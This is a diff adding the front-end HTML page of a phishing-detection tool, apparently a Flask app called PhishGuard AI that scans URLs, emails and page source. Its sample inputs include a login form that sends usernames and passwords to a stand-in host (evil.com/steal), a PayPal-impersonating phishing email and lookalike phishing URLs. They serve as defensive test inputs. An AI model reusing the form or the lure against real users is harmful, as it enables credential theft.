@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>PhishGuard AI – Phishing Detection</title>
+  <link rel="stylesheet" href="/static/css/style.css" />
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet">
+</head>
+<body>
+
+  <!-- ── Animated background grid ───── -->
+  <div class="bg-grid" aria-hidden="true"></div>
+  <div class="bg-glow" aria-hidden="true"></div>
+
+  <!-- ══════════════════════════════════
+       HEADER
+  ══════════════════════════════════ -->
+  <header class="site-header">
+    <div class="header-inner">
+      <div class="logo">
+        <span class="logo-icon">🛡</span>
+        <span class="logo-text">Phish<span class="accent">Guard</span></span>
+        <span class="logo-badge">AI</span>
+      </div>
+      <nav class="header-nav">
+        <a href="#scanner" class="nav-link active">Scanner</a>
+        <a href="#history" class="nav-link" onclick="loadHistory()">History</a>
+        <a href="/api/docs"  class="nav-link" target="_blank">API Docs</a>
+      </nav>
+      <div class="header-status">
+        <span class="status-dot"></span>
+        <span class="status-text">Online</span>
+      </div>
+    </div>
+  </header>
+
+  <!-- ══════════════════════════════════
+       HERO
+  ══════════════════════════════════ -->
+  <section class="hero">
+    <p class="hero-overline">AI-Powered Cybersecurity Tool</p>
+    <h1 class="hero-title">
+      Detect <span class="accent">Phishing</span><br>
+      Before It Strikes
+    </h1>
+    <p class="hero-subtitle">
+      Analyse URLs, emails, and web pages using machine learning<br>
+      and advanced heuristics in real time.
+    </p>
+
+    <div class="hero-stats">
+      <div class="stat"><span class="stat-num">24+</span><span class="stat-label">ML Features</span></div>
+      <div class="stat-divider"></div>
+      <div class="stat"><span class="stat-num">3</span><span class="stat-label">Scan Modes</span></div>
+      <div class="stat-divider"></div>
+      <div class="stat"><span class="stat-num">99ms</span><span class="stat-label">Avg Scan Time</span></div>
+    </div>
+  </section>
+
+  <!-- ══════════════════════════════════
+       SCANNER CARD
+  ══════════════════════════════════ -->
+  <main id="scanner" class="container">
+
+    <div class="scanner-card">
+
+      <!-- Tab selector -->
+      <div class="tab-bar" role="tablist">
+        <button class="tab active" role="tab" data-tab="url"   onclick="switchTab('url')">
+          <span class="tab-icon">🔗</span> URL
+        </button>
+        <button class="tab" role="tab" data-tab="email" onclick="switchTab('email')">
+          <span class="tab-icon">📧</span> Email
+        </button>
+        <button class="tab" role="tab" data-tab="html"  onclick="switchTab('html')">
+          <span class="tab-icon">🌐</span> HTML
+        </button>
+      </div>
+
+      <!-- ── URL Panel ── -->
+      <div id="panel-url" class="panel active">
+        <label class="input-label">Enter a URL to analyse</label>
+        <div class="input-row">
+          <div class="input-wrapper">
+            <span class="input-prefix">URL</span>
+            <input id="url-input" type="url" class="text-input"
+                   placeholder="https://suspicious-site.example.com"
+                   onkeydown="if(event.key==='Enter') scan()" />
+          </div>
+          <button class="scan-btn" onclick="scan()">
+            <span class="btn-icon">⚡</span> Scan
+          </button>
+        </div>
+        <div class="quick-tests">
+          <span class="qt-label">Try:</span>
+          <button class="qt-btn" onclick="quickTest('http://paypa1-verify.tk/login')">Phishing URL</button>
+          <button class="qt-btn" onclick="quickTest('https://www.google.com')">Legit URL</button>
+          <button class="qt-btn" onclick="quickTest('http://amazon-secure-update.xyz/account')">Suspicious</button>
+        </div>
+      </div>
+
+      <!-- ── Email Panel ── -->
+      <div id="panel-email" class="panel">
+        <label class="input-label">Paste raw email content (headers + body)</label>
+        <textarea id="email-input" class="text-area" rows="10"
+                  placeholder="From: security@paypa1-verify.tk&#10;To: victim@gmail.com&#10;Subject: URGENT: Your account will be suspended!&#10;&#10;Dear Customer,&#10;&#10;Your PayPal account has been limited. Click here immediately to verify your identity:&#10;http://paypa1.verify-now.tk/login&#10;&#10;Failure to verify within 24 hours will result in permanent suspension."></textarea>
+        <button class="scan-btn full-width" onclick="scan()">
+          <span class="btn-icon">⚡</span> Scan Email
+        </button>
+      </div>
+
+      <!-- ── HTML Panel ── -->
+      <div id="panel-html" class="panel">
+        <label class="input-label">Paste HTML page source to analyse</label>
+        <textarea id="html-input" class="text-area" rows="10"
+                  placeholder="<html>&#10;<body>&#10;<form action='http://evil.com/steal' method='post'>&#10;  <input type='text' name='username' placeholder='Email'>&#10;  <input type='password' name='password' placeholder='Password'>&#10;  <input type='hidden' name='token' value='abc123'>&#10;  <button>Sign In</button>&#10;</form>&#10;</body>&#10;</html>"></textarea>
+        <button class="scan-btn full-width" onclick="scan()">
+          <span class="btn-icon">⚡</span> Scan HTML
+        </button>
+      </div>
+
+    </div><!-- /scanner-card -->
+
+    <!-- ══════════════════════════════════
+         RESULT PANEL
+    ══════════════════════════════════ -->
+    <div id="result-panel" class="result-panel hidden">
+
+      <!-- Loading state -->
+      <div id="loading-state" class="loading-state hidden">
+        <div class="scanner-beam"></div>
+        <div class="loading-text">
+          <span class="spin-icon">⟳</span>
+          <span id="loading-msg">Analysing…</span>
+        </div>
+      </div>
+
+      <!-- Result content -->
+      <div id="result-content" class="hidden">
+
+        <!-- Verdict banner -->
+        <div id="verdict-banner" class="verdict-banner">
+          <div class="verdict-left">
+            <div id="verdict-icon"  class="verdict-icon">🔍</div>
+            <div>
+              <div id="verdict-label" class="verdict-label">Scanning…</div>
+              <div id="verdict-sub"   class="verdict-sub">Risk Assessment</div>
+            </div>
+          </div>
+          <div class="verdict-right">
+            <div id="score-display" class="score-display">
+              <svg class="score-ring" viewBox="0 0 120 120">
+                <circle class="ring-track" cx="60" cy="60" r="50"/>
+                <circle id="ring-fill" class="ring-fill" cx="60" cy="60" r="50"
+                        stroke-dasharray="314" stroke-dashoffset="314"/>
+              </svg>
+              <div class="score-inner">
+                <span id="score-number" class="score-number">0</span>
+                <span class="score-unit">/100</span>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Score breakdown -->
+        <div class="score-breakdown">
+          <div class="breakdown-item">
+            <span class="breakdown-label">🤖 ML Score</span>
+            <div class="breakdown-bar-wrap">
+              <div id="ml-bar" class="breakdown-bar ml-bar" style="width:0%"></div>
+            </div>
+            <span id="ml-score-val" class="breakdown-val">0%</span>
+          </div>
+          <div class="breakdown-item">
+            <span class="breakdown-label">📏 Rule Score</span>
+            <div class="breakdown-bar-wrap">
+              <div id="rule-bar" class="breakdown-bar rule-bar" style="width:0%"></div>
+            </div>
+            <span id="rule-score-val" class="breakdown-val">0%</span>
+          </div>
+        </div>
+
+        <!-- Issues list -->
+        <div class="issues-section">
+          <h3 class="section-title">
+            <span>⚠️ Detected Issues</span>
+            <span id="issue-count" class="issue-count-badge">0</span>
+          </h3>
+          <ul id="issues-list" class="issues-list"></ul>
+        </div>
+
+        <!-- Feature table toggle -->
+        <div class="features-toggle" onclick="toggleFeatures()">
+          <span>📊 Feature Details</span>
+          <span id="features-arrow">▼</span>
+        </div>
+        <div id="features-section" class="features-section hidden">
+          <table class="features-table">
+            <thead>
+              <tr><th>Feature</th><th>Value</th></tr>
+            </thead>
+            <tbody id="features-body"></tbody>
+          </table>
+        </div>
+
+        <!-- Action buttons -->
+        <div class="result-actions">
+          <button class="action-btn" onclick="copyJSON()">📋 Copy JSON</button>
+          <button class="action-btn" onclick="downloadReport('json')">⬇ JSON Report</button>
+          <button class="action-btn" onclick="downloadReport('html')">⬇ HTML Report</button>
+          <button class="action-btn secondary" onclick="clearResult()">✕ Clear</button>
+        </div>
+
+        <!-- Raw JSON collapsible -->
+        <details class="raw-json-details">
+          <summary>View Raw JSON</summary>
+          <pre id="raw-json" class="raw-json"></pre>
+        </details>
+
+      </div><!-- /result-content -->
+    </div><!-- /result-panel -->
+
+
+    <!-- ══════════════════════════════════
+         SCAN HISTORY
+    ══════════════════════════════════ -->
+    <section id="history" class="history-section">
+      <div class="section-header">
+        <h2 class="section-heading">Recent Scans</h2>
+        <button class="refresh-btn" onclick="loadHistory()">↺ Refresh</button>
+      </div>
+      <div id="history-table-wrap" class="history-table-wrap">
+        <p class="history-empty">Click Refresh to load scan history.</p>
+      </div>
+    </section>
+
+  </main><!-- /container -->
+
+  <!-- ══════════════════════════════════
+       FOOTER
+  ══════════════════════════════════ -->
+  <footer class="site-footer">
+    <p>PhishGuard AI &nbsp;·&nbsp; v1.0.0 &nbsp;·&nbsp;
+      Built with Flask + scikit-learn &nbsp;·&nbsp;
+      <a href="/api/docs" target="_blank">API Docs</a>
+    </p>
+  </footer>
+
+  <script src="/static/js/app.js"></script>
+</body>
+</html>
